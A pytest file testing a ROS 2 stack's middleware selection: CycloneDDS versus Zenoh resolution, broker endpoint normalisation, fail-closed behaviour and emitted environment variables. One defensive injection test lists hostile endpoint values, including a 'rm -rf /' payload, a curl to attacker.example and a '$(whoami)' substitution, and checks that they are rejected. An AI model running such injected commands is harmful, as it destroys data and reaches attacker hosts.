"""The transport is chosen when the stack is started, and Zenoh means someone else's broker.

``rmw_cyclonedds_cpp`` was spelled as a literal in the base compose file, in the
generator that supersedes it, and in the Dockerfile that installs the RMW. Nothing
was wrong with the choice; what was wrong is that it was not a choice. A cell on a
plant network with multicast filtered, or one that must federate with a site-wide
Zenoh broker, could not be started differently without editing the generator.

``agents/middleware.py`` now owns the decision, and these tests pin the two
properties that make it safe rather than merely configurable:

  * **A typo cannot silently downgrade the transport.** ``RMW=zenow`` raises. If it
    returned the default instead, the stack would come up on CycloneDDS while the
    operator believed it was on Zenoh, and the symptom ("the broker sees no
    traffic") would surface a long way from the cause.
  * **Zenoh without a broker refuses to start.** This stack runs no router — the
    broker is the operator's, already on their network. rmw_zenoh's own default is
    ``tcp/localhost:7447``, which inside a container resolves to that container, so
    an unset endpoint would produce a stack that looks healthy with every agent
    talking only to itself. Fail closed instead.

Also pinned: only the selected middleware's variables are emitted. Carrying
``CYCLONEDDS_URI`` into a Zenoh stack would be configuration that reads as live and
is not — the same class of defect as a cell declaring a ``check_frequency`` that the
monitor ignores in favour of a literal.

Host-only: stdlib and source text. No ROS, no zenoh, no network.
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

PROJECT_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(PROJECT_ROOT))


@pytest.fixture
def mw():
    return pytest.importorskip("agents.middleware")


@pytest.fixture(autouse=True)
def clean_env(monkeypatch):
    """Resolution must be decided by the test, not by the developer's shell."""
    for var in ("RMW", "RMW_IMPLEMENTATION", "ZENOH_ROUTER"):
        monkeypatch.delenv(var, raising=False)


# ── the default is unchanged ──────────────────────────────────────────────────

def test_the_default_is_cyclonedds(mw):
    assert mw.DEFAULT_MIDDLEWARE == "cyclonedds"
    assert mw.resolve_middleware() == "cyclonedds"


def test_the_default_still_loads_the_rmw_the_stack_shipped_with(mw):
    assert mw.rmw_implementation(mw.resolve_middleware()) == "rmw_cyclonedds_cpp"


def test_cyclonedds_needs_no_broker(mw):
    assert mw.uses_broker("cyclonedds") is False
    assert mw.router_endpoints("cyclonedds") is None


# ── resolution precedence ─────────────────────────────────────────────────────

def test_explicit_beats_environment(mw, monkeypatch):
    monkeypatch.setenv("RMW", "cyclonedds")
    assert mw.resolve_middleware("zenoh") == "zenoh"


def test_rmw_env_var_selects_the_transport(mw, monkeypatch):
    monkeypatch.setenv("RMW", "zenoh")
    assert mw.resolve_middleware() == "zenoh"


def test_a_ros_configured_shell_is_not_overridden_by_the_default(mw, monkeypatch):
    """RMW_IMPLEMENTATION is the conventional variable; contradicting it would be rude."""
    monkeypatch.setenv("RMW_IMPLEMENTATION", "rmw_zenoh_cpp")
    assert mw.resolve_middleware() == "zenoh"


def test_rmw_beats_rmw_implementation(mw, monkeypatch):
    monkeypatch.setenv("RMW", "cyclonedds")
    monkeypatch.setenv("RMW_IMPLEMENTATION", "rmw_zenoh_cpp")
    assert mw.resolve_middleware() == "cyclonedds"


@pytest.mark.parametrize("spelling", ["zenoh", "Zenoh", " ZENOH ", "rmw_zenoh_cpp"])
def test_plausible_spellings_all_reach_zenoh(mw, spelling):
    assert mw.normalize_middleware(spelling) == "zenoh"


@pytest.mark.parametrize("spelling", ["cyclonedds", "cyclone", "dds",
                                      "rmw_cyclonedds_cpp"])
def test_plausible_spellings_all_reach_cyclonedds(mw, spelling):
    assert mw.normalize_middleware(spelling) == "cyclonedds"


# ── a typo must not quietly start the wrong transport ─────────────────────────

def test_an_unknown_middleware_raises_rather_than_defaulting(mw):
    with pytest.raises(ValueError) as exc:
        mw.normalize_middleware("zenow")
    assert "zenow" in str(exc.value)


def test_the_error_names_the_valid_choices(mw):
    with pytest.raises(ValueError) as exc:
        mw.normalize_middleware("fastdds")
    message = str(exc.value)
    for valid in mw.VALID_MIDDLEWARES:
        assert valid in message


def test_empty_is_not_a_typo_it_is_absence(mw):
    assert mw.normalize_middleware("") is None
    assert mw.normalize_middleware(None) is None


# ── Zenoh requires an existing broker; this stack runs none ───────────────────

def test_zenoh_is_brokered(mw):
    assert mw.uses_broker("zenoh") is True


def test_zenoh_without_a_broker_refuses(mw):
    """The localhost default would give every container its own island."""
    with pytest.raises(ValueError) as exc:
        mw.router_endpoints("zenoh")
    assert "ZENOH_ROUTER" in str(exc.value)


def test_zenoh_without_a_broker_refuses_to_build_env(mw):
    with pytest.raises(ValueError):
        mw.middleware_env("zenoh", "welding_cell_2_small")


def test_the_broker_may_come_from_the_environment(mw, monkeypatch):
    monkeypatch.setenv("ZENOH_ROUTER", "tcp/broker.plant.local:7447")
    assert mw.router_endpoints("zenoh") == "tcp/broker.plant.local:7447"


def test_no_router_service_name_is_exported(mw):
    """Nothing may reference an in-stack router: the stack does not start one."""
    assert not hasattr(mw, "MANAGED_ROUTER_SERVICE")
    assert not hasattr(mw, "needs_managed_router")


# ── endpoint normalisation: what an operator would plausibly type ─────────────

@pytest.mark.parametrize("given,expected", [
    ("broker.plant.local",           "tcp/broker.plant.local:7447"),
    ("broker.plant.local:7447",      "tcp/broker.plant.local:7447"),
    ("tcp/broker.plant.local:7447",  "tcp/broker.plant.local:7447"),
    ("TCP/broker.plant.local",       "tcp/broker.plant.local:7447"),
    ("10.0.0.5:7448",                "tcp/10.0.0.5:7448"),
    ("tls/broker.plant.local:7447",  "tls/broker.plant.local:7447"),
])
def test_endpoints_normalise_to_proto_host_port(mw, given, expected):
    assert mw.normalize_router_endpoint(given) == expected


def test_the_default_port_is_the_ros_router_port(mw):
    assert mw.DEFAULT_ZENOH_PORT == 7447


def test_several_brokers_may_be_listed(mw):
    """A production broker is usually more than one address."""
    assert mw.normalize_router_endpoint("a.local, b.local:7448") == \
        "tcp/a.local:7447,tcp/b.local:7448"


def test_bracketed_ipv6_keeps_its_colons(mw):
    """The colons in [fd00::1] are not port separators."""
    assert mw.normalize_router_endpoint("[fd00::1]") == "tcp/[fd00::1]:7447"
    assert mw.normalize_router_endpoint("[fd00::1]:7448") == "tcp/[fd00::1]:7448"


def test_nothing_specified_is_not_an_error_here(mw):
    """Absence is reported as None; whether it is fatal is router_endpoints' call."""
    assert mw.normalize_router_endpoint(None) is None
    assert mw.normalize_router_endpoint("  ") is None


# ── the endpoint is an injection boundary ─────────────────────────────────────

@pytest.mark.parametrize("hostile", [
    'evil";rm -rf /',
    "broker.local:7447 && curl attacker.example",
    "broker.local\nconnect/endpoints=[]",
    "$(whoami).local",
    "broker.local;echo",
])
def test_a_malformed_endpoint_is_rejected_not_interpolated(mw, hostile):
    with pytest.raises(ValueError):
        mw.normalize_router_endpoint(hostile)


# ── only the selected middleware's configuration is emitted ───────────────────

def test_cyclonedds_env_points_at_the_cells_dds_config(mw):
    env = mw.middleware_env("cyclonedds", "welding_cell_2_small")
    assert env["RMW_IMPLEMENTATION"] == "rmw_cyclonedds_cpp"
    assert env["CYCLONEDDS_URI"] == \
        "file:///cells/welding_cell_2_small/config/cyclonedds.xml"


def test_cyclonedds_env_carries_no_zenoh_configuration(mw):
    env = mw.middleware_env("cyclonedds", "welding_cell_2_small")
    assert not [k for k in env if "ZENOH" in k]


def test_zenoh_env_carries_no_dds_configuration(mw):
    """Dead config reads as live. It must not be there at all."""
    env = mw.middleware_env("zenoh", "welding_cell_2_small",
                            router="tcp/broker.plant.local:7447")
    assert env["RMW_IMPLEMENTATION"] == "rmw_zenoh_cpp"
    assert "CYCLONEDDS_URI" not in env


def test_zenoh_env_names_the_broker_explicitly(mw):
    env = mw.middleware_env("zenoh", "welding_cell_2_small",
                            router="tcp/broker.plant.local:7447")
    assert env["ZENOH_CONFIG_OVERRIDE"] == \
        'connect/endpoints=["tcp/broker.plant.local:7447"]'


def test_zenoh_env_never_falls_back_to_localhost(mw):
    env = mw.middleware_env("zenoh", "welding_cell_2_small", router="broker.plant.local")
    assert "localhost" not in env["ZENOH_CONFIG_OVERRIDE"]


def test_several_brokers_reach_the_override_as_a_json_array(mw):
    env = mw.middleware_env("zenoh", "welding_cell_2_small",
                            router="a.local:7447,b.local:7448")
    assert env["ZENOH_CONFIG_OVERRIDE"] == \
        'connect/endpoints=["tcp/a.local:7447","tcp/b.local:7448"]'


def test_a_session_config_is_referenced_only_when_asked_for(mw):
    """The escape hatch for what the override cannot express — never a dangling path."""
    without = mw.middleware_env("zenoh", "welding_cell_2_small", router="b.local")
    assert "ZENOH_SESSION_CONFIG_URI" not in without
    with_uri = mw.middleware_env(
        "zenoh", "welding_cell_2_small", router="b.local",
        session_config_uri="file:///cells/welding_cell_2_small/config/zenoh_session.json5")
    assert with_uri["ZENOH_SESSION_CONFIG_URI"].endswith("zenoh_session.json5")


# ── the operator can see which transport they got ─────────────────────────────

def test_describe_says_peer_to_peer_for_cyclonedds(mw):
    line = mw.describe("cyclonedds")
    assert "rmw_cyclonedds_cpp" in line and "peer-to-peer" in line


def test_describe_names_the_broker_for_zenoh(mw):
    line = mw.describe("zenoh", "tcp/broker.plant.local:7447")
    assert "rmw_zenoh_cpp" in line
    assert "tcp/broker.plant.local:7447" in line
    assert "external broker" in line


# ── the generator and the images must agree with this module ──────────────────

def test_the_generator_imports_the_decision_rather_than_repeating_it(mw):
    """A middleware literal in the generator is how it and the Dockerfile drift."""
    src = (PROJECT_ROOT / "scripts" / "generate_compose.py").read_text()
    assert "from agents.middleware import" in src
    # The RMW name itself appears only in middleware.py.
    assert "rmw_cyclonedds_cpp" not in src
    assert "rmw_zenoh_cpp" not in src


def test_the_generator_starts_no_router(mw):
    """`--zenoh-router` names someone else's broker; it never becomes a service."""
    src = (PROJECT_ROOT / "scripts" / "generate_compose.py").read_text()
    assert "rmw_zenohd" not in src          # the router daemon
    assert "zenoh_router_service" not in src  # a generator that would emit one


def test_every_rmw_in_the_catalog_is_installed_in_the_image(mw):
    """An RMW that is selectable but absent fails at runtime, per container."""
    dockerfile = (PROJECT_ROOT / "docker" / "Dockerfile").read_text()
    for rmw in mw.RMW_IMPLEMENTATIONS.values():
        package = "ros-jazzy-" + rmw.replace("_", "-")
        assert package in dockerfile, f"{package} missing from docker/Dockerfile"


def test_the_viewer_image_can_speak_every_transport_too(mw):
    """rviz-web gets the same RMW_IMPLEMENTATION as everything else."""
    dockerfile = (PROJECT_ROOT / "docker" / "Dockerfile.viz").read_text()
    for rmw in mw.RMW_IMPLEMENTATIONS.values():
        package = "ros-jazzy-" + rmw.replace("_", "-")
        assert package in dockerfile, f"{package} missing from docker/Dockerfile.viz"
